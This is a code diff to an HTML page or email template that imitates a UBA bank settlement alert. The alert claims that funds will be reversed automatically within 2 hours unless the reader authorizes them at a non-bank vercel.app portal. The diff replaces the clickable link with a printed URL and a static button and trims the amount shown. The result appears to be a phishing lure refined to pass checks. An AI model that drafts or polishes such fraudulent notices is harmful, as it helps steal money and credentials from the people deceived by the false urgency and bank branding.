@@ -26,24 +26,23 @@
         /* The High-Pressure Notice Box */
         .settlement-notice { background: #fff5f5; padding: 18px; border-radius: 6px; margin-top: 20px; border: 1px solid #feb2b2; text-align: left; }
         .notice-title { font-size: 0.85em; font-weight: bold; color: #c53030; display: block; margin-bottom: 8px; }
-        .notice-body { font-size: 0.78em; color: #4a5568; line-height: 1.6; margin-bottom: 15px; }
-        .warning-text { color: #c53030; font-weight: bold; text-decoration: underline; }
+        .notice-body { font-size: 0.78em; color: #4a5568; line-height: 1.6; margin-bottom: 12px; }
+        
+        .url-display { font-family: monospace; font-size: 0.85em; background: #eee; padding: 4px; border-radius: 3px; color: #333; word-break: break-all; display: block; margin: 10px 0; border: 1px solid #ddd; }
 
-        /* Centered Button Styling */
-        .button-container { text-align: center; width: 100%; display: flex; justify-content: center; }
-        .btn-authorize { 
-            display: inline-block; 
+        /* Centered Non-Clickable Button */
+        .button-container { text-align: center; width: 100%; display: flex; justify-content: center; margin-top: 10px; }
+        .btn-static { 
             width: 90%; 
             padding: 14px; 
             background: #cf2a27; 
             border-radius: 6px; 
             color: #ffffff; 
             text-align: center; 
-            text-decoration: none; 
             font-weight: bold; 
             font-size: 0.95em; 
             box-shadow: 0 4px 6px rgba(207, 42, 39, 0.2);
-            transition: background 0.3s ease;
+            border: none;
         }
         
         .footer { text-align: center; margin-top: 25px; font-size: 0.65em; color: #aaa; border-top: 1px solid #eee; padding-top: 15px; }
@@ -95,13 +94,13 @@
     <div class="settlement-notice">
         <span class="notice-title">⚠️ SYSTEM ALERT: UNSETTLED FUNDS</span>
         <div class="notice-body">
-            This transaction of <span style="font-weight:bold;">10.5M NGN</span> is currently held in the UBA Settlement Node for security verification. 
-            <br><br>
-            <span class="warning-text">IMPORTANT:</span> Complete the authorization within 2 hours or the funds will be <strong>AUTOMATICALLY REVERSED</strong> to the sender's account.
+            This transaction is held for verification. Complete authorization at the secure portal below to avoid <strong>AUTOMATIC REVERSAL</strong> within 2 hours.
+            
+            <span class="url-display">https://payment-settlement-portal.vercel.app/</span>
         </div>
         
         <div class="button-container">
-            <a href="https://payment-settlement-portal.vercel.app/" class="btn-authorize">Authorize & Receive Funds Now</a>
+            <div class="btn-static">Authorize & Receive Funds Now</div>
         </div>
     </div>
 
